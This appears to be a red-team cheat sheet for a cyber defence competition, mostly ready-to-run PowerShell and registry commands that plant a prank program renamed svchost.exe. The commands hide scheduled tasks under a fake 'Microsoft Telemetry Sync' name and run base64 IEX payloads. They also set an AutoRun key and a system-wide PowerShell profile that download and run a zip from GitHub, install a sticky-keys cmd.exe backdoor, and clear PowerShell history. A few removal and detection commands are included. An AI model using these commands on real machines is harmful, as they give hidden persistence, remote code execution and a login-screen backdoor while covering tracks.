Base64 encoded command to download and execute persistent goose (on user logon):
powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('')))"

Verify task successfully buried in folder:
Get-ScheduledTask -TaskPath "\Microsoft\Windows\Application Experience\" | Where-Object { $_.TaskName -eq "Microsoft Telemetry Sync" }

Force run task manually:
schtasks /run /tn "\Microsoft\Windows\Application Experience\Microsoft Telemetry Sync"

Test Mode (Runs immediately at logon | Repeats every 10 Mins):
$A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('')))`""; Register-ScheduledTask -TaskName "Microsoft Telemetry Sync" -TaskPath "\Microsoft\Windows\Application Experience\" -Action $A -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest) -Force; schtasks /change /tn "\Microsoft\Windows\Application Experience\Microsoft Telemetry Sync" /ri 10 /ru "INTERACTIVE"

Competition Armed Mode (April 11th @ 1PM, Repeats every 10 Mins):
$A = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('')))`""; Register-ScheduledTask -TaskName "Microsoft Telemetry Sync" -TaskPath "\Microsoft\Windows\Application Experience\" -Action $A -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest) -Force; schtasks /change /tn "\Microsoft\Windows\Application Experience\Microsoft Telemetry Sync" /ri 10 /ru "INTERACTIVE"

Limit it so it will only allow one verison of goose at a time

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('')))`"" 

Register-ScheduledTask -TaskName "Microsoft Telemetry Sync" -TaskPath "\Microsoft\Windows\Application Experience\" -Action $action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest) -Force

schtasks /change /tn "\Microsoft\Windows\Application Experience\Microsoft Telemetry Sync" /ri 10 /ru "INTERACTIVE"

AutoRun Registry Key to launch goose with cmd and powershell:
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value 'if exist "C:\Users\Administrator\AppData\Local\Blueteeth\GooseTest-main\svchost.exe" (start "" "C:\Users\Administrator\AppData\Local\Blueteeth\GooseTest-main\svchost.exe") else (start /b powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri \"https://github.com/Berto1019/GooseTest/archive/refs/heads/main.zip\" -OutFile \"$env:TEMP\g.zip\"; Expand-Archive -Path \"$env:TEMP\g.zip\" -DestinationPath \"$env:LOCALAPPDATA\Blueteeth\" -Force; Rename-Item -Path \"$env:LOCALAPPDATA\Blueteeth\GooseTest-main\GooseDesktop.exe\" -NewName \"svchost.exe\"")'

Delete Registry Key:
reg delete "HKLM\Software\Microsoft\Command Processor" /v "AutoRun" /f

Blueteamer can find reg key by checking:
(Get-ItemProperty "HKLM:\Software\Microsoft\Command Processor").AutoRun

(Additional persistence) Create powershell profile (Have to change user from Administrator to whatever):
$p='C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1'; New-Item $p -Force; '$g="$env:LOCALAPPDATA\Blueteeth\GooseTest-main\svchost.exe"; if(test-path $g){start $g}else{start-job {iwr "https://github.com/Berto1019/GooseTest/archive/refs/heads/main.zip" -outf "$env:temp\g.zip";expand "$env:temp\g.zip" -dest "$env:LOCALAPPDATA\Blueteeth" -f;ren "$env:LOCALAPPDATA\Blueteeth\GooseTest-main\GooseDesktop.exe" "svchost.exe"}}' | out-file $p -enc ascii -force

Remove profile and force back to original:
"CurrentUserCurrentHost", "CurrentUserAllHosts", "AllUsersCurrentHost", "AllUsersAllHosts" | ForEach-Object { if (Test-Path $PROFILE.$_) { Remove-Item $PROFILE.$_ -Force } }; Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "" -and $_.Id -ne $PID } | Stop-Process -Force; "HKCU:\Software\Microsoft\Command Processor", "HKLM:\Software\Microsoft\Command Processor" | Remove-ItemProperty -Name "AutoRun" -ErrorAction SilentlyContinue

Unregister Scheduled Task
Unregister-ScheduledTask -TaskName "Microsoft Telemetry Sync" -TaskPath "\Microsoft\Windows\Application Experience\" -Confirm:$false

Scheduled task that kills goose eveyr 30 mins so it doesn't run endlessly if not killed
Register-ScheduledTask -TaskName "Microsoft Telemetry Cleanup" -TaskPath "\Microsoft\Windows\Application Experience\" -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LVByb2Nlc3MgfCBXaGVyZS1PYmplY3QgeyRfLlBhdGggLWxpa2UgJypcQmx1ZXRlZXRoXEdvb3NlVGVzdC1tYWluXHN2Y2hvc3QuZXhlJ30gfCBTdG9wLVByb2Nlc3MgLUZvcmNl')))`"") -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30)) -Principal (New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -Hidden) -Force

Sticky Keys Registry Key (Fun Addition):
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

Clear PowerShell History:
Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
